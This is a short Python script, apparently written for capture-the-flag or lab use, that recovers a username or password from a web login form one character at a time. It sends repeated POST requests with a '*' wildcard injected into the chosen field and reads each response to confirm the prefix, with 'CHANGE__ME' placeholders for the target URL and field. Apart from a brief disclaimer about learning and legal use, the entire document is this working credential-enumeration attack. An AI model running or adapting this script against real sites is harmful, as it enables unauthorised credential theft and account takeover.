#Ensure that you only use this tool for learning & legal research purposes
#
#
#Ensure that you replace the "CHANGE__ME" section to your specific 
#
#If in case you would like to add/assist me in learning a better way to improve this script please feel free to reach out to me in the comments!
#Tahkn you!


import requests
import urllib3
from string import ascii_lowercase, ascii_uppercase

list = ascii_lowercase+ascii_uppercase+'0123456789_(){}'

        #Change URL depending on the site
url = 'CHANGE__ME'
        #When values found change: Somevalue to value
        #You can use * as a wildcard to select all (DB functionality)
task = {'username': 'somevalue', 'password':'somevalue'}
result = ''

print('NOW LOADING!')


flag = 1
while flag == 1:
    flag = 0
    for l in list:
            #Change if enumerating User or pass
        task['CHANGE__ME'] = result + l + '*'
        req = requests.post(url, data = task)
        if ('No results' in req.text):
                result = result + l 
                flag = 1
                print(result)
                break
print('All good!')
